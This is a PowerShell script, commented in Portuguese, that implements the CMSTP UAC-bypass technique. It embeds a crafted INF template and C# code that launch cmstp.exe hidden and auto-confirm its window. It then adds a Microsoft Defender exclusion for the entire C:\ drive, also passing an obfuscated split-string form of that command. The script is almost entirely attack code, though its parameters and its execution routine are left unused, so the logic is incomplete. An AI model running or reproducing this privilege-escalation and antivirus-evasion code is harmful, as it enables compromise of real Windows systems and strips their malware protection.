# Função de Bypass UAC
function ola {
    param(
        [Parameter(Mandatory = $true)]
        [string]$execApp,

        [Parameter()]
        [string]$latencyxCommand
    )

    $infTemplate = @'
    [version]
    Signature=$chicago$
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=bypass-CustomSectionAllUsers
    RunPreSetupCommands=bypass-RunSetupCommands

    [bypass-RunSetupCommands]
    TASK
    taskkill /IM cmstp.exe /F

    [bypass-CustomSectionAllUsers]
    49000,49001=bypass-AllUserLDIDSection, 7

    [bypass-AllUserLDIDSection]
    "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="bypassVPN"
    ShortSvcName="bypassVPN"
    '@

    $embeddedCode = @"
    using System;
    using System.Threading;
    using System.Text;
    using System.IO;
    using System.Diagnostics;
    using System.ComponentModel;
    using System.Runtime.InteropServices;

    public class BypassCMSTP
    {
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        public static string cmstpPath = "c:\\windows\\system32\\cmstp.exe";

        public static string CreateInfFile(string cmdToRun, string infContent)
        {
            StringBuilder outputFilePath = new StringBuilder();
            outputFilePath.Append("C:\\windows\\temp");
            outputFilePath.Append("\\");
            outputFilePath.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
            outputFilePath.Append(".inf");
            StringBuilder newInfContent = new StringBuilder(infContent);
            newInfContent.Replace("TASK", cmdToRun);
            File.WriteAllText(outputFilePath.ToString(), newInfContent.ToString());
            return outputFilePath.ToString();
        }

        public static bool ExecuteCommand(string cmdToRun, string infContent)
        {
            const int WM_SYSKEYDOWN = 0x0100;
            const int VK_RETURN = 0x0D;

            StringBuilder infFile = new StringBuilder();
            infFile.Append(CreateInfFile(cmdToRun, infContent));

            ProcessStartInfo startInfo = new ProcessStartInfo(cmstpPath);
            startInfo.Arguments = "/au " + infFile.ToString();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Oculta a janela
            IntPtr dptr = Marshal.AllocHGlobal(1);
            ShellExecute(dptr, "", cmstpPath, startInfo.Arguments, "", 0);

            Thread.Sleep(3000);
            IntPtr uacWindow = FindWindow(null, "bypassVPN");

            PostMessage(uacWindow, WM_SYSKEYDOWN, VK_RETURN, 0);
            Thread.Sleep(5000);
            File.Delete(infFile.ToString());
            return true;
        }
    }
    "@

    # Adiciona o código
    Add-Type $embeddedCode

    # Comando sem ofuscação para testar diretamente
    Add-MpPreference -ExclusionPath "C:\"
}

# Executa a função
ola -execApp "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
